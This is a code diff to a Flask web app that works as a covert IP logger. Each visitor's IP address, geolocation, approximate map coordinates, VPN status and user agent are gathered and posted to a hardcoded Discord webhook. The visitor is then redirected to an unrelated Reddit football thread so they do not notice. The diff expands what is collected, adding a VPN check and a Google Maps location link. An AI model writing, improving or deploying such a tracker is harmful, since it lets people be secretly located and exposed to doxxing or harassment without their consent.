@@ -11,14 +11,23 @@ DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1427010775163080868/6Uaf
 def get_visitor_info(ip, user_agent):
     try:
         ipapi_url = f"https://ipapi.co/{ip}/json/"
-        resp = requests.get(ipapi_url, timeout=5)
-        if resp.status_code != 200:
-            return None
-        details = resp.json()
+        geoip_url = f"https://json.geoiplookup.io/{ip}"
 
-        return {
+        details_resp = requests.get(ipapi_url, timeout=5)
+        vpn_resp = requests.get(geoip_url, timeout=5)
+
+        if details_resp.status_code != 200 or vpn_resp.status_code != 200:
+            return None
+
+        details = details_resp.json()
+        vpnconn = vpn_resp.json()
+
+        vpn = "Yes" if vpnconn.get("connection_type") == "Corporate" else "No"
+
+        info = {
             "ip": ip,
-            "user_agent": user_agent[:256],  # limit user agent length
+            "user_agent": user_agent[:512],  # Limit length to avoid issues
+            "vpn": vpn,
             "country": details.get("country_name", "Unknown"),
             "countryCode": details.get("country_code", "xx").lower(),
             "region": details.get("region", ""),
@@ -29,31 +38,36 @@ def get_visitor_info(ip, user_agent):
             "date": datetime.datetime.utcnow().strftime("%d/%m/%Y"),
             "time": datetime.datetime.utcnow().strftime("%H:%M:%S"),
         }
+        return info
     except Exception as e:
         print(f"Error in get_visitor_info: {e}")
         return None
 
 def send_to_discord(info):
     if not info:
+        print("No info to send to Discord.")
         return
 
     try:
         flag_url = f"https://countryflagsapi.com/png/{info['countryCode']}"
 
+        ip_city = f"{info['ip']} ({info['city'] if info['city'] else 'Unknown City'})"
+
         embed = {
             "username": "hexdzt",
-            "avatar_url": "https://i.imgur.com/7GwrH0B.png",  # your bot avatar URL
+            "avatar_url": "https://i.imgur.com/7GwrH0B.png",  # Custom avatar URL, change if needed
             "embeds": [{
-                "title": f"Visitor from {info['country']}",
-                "color": 0x3498db,
+                "title": f"Visitor From {info['country']}",
+                "color": 39423,
                 "fields": [
-                    {"name": "IP Address", "value": info['ip'], "inline": True},
-                    {"name": "Location", "value": f"{info['region']} | {info['city']} | {info['zip']}", "inline": True},
-                    {"name": "Coordinates", "value": f"[Google Maps](https://www.google.com/maps/search/?api=1&query={info['lat']},{info['lon']})"},
-                    {"name": "User Agent", "value": info['user_agent']}
+                    {"name": "IP & City", "value": ip_city, "inline": True},
+                    {"name": "VPN?", "value": info["vpn"], "inline": True},
+                    {"name": "Useragent", "value": info["user_agent"]},
+                    {"name": "Country/CountryCode", "value": f"{info['country']}/{info['countryCode'].upper()}", "inline": True},
+                    {"name": "Region | City | Zip", "value": f"[{info['region']} | {info['city']} | {info['zip']}](https://www.google.com/maps/search/?api=1&query={info['lat']},{info['lon']} 'Google Maps Location (+/- 750M Radius)')", "inline": True},
                 ],
                 "footer": {
-                    "text": f"Date: {info['date']} Time: {info['time']}",
+                    "text": f"{info['date']} {info['time']}",
                     "icon_url": "https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png"
                 },
                 "thumbnail": {"url": flag_url}
@@ -61,9 +75,9 @@ def send_to_discord(info):
         }
 
         headers = {"Content-Type": "application/json"}
-        response = requests.post(DISCORD_WEBHOOK_URL, headers=headers, data=json.dumps(embed))
-        if response.status_code != 204:
-            print(f"Failed to send webhook: {response.status_code} {response.text}")
+        resp = requests.post(DISCORD_WEBHOOK_URL, data=json.dumps(embed), headers=headers, timeout=5)
+        if resp.status_code != 204:
+            print(f"Failed to send webhook: {resp.status_code} {resp.text}")
     except Exception as e:
         print(f"Error sending to Discord: {e}")
 
@@ -75,8 +89,8 @@ def index():
 
     user_agent = request.headers.get('User-Agent', 'Unknown')
 
+    # Prevent sending if localhost (optional)
     if not ip or ip.startswith('127.') or ip == '::1':
-        # Just redirect anyway for localhost
         return redirect("https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/")
 
     info = get_visitor_info(ip, user_agent)
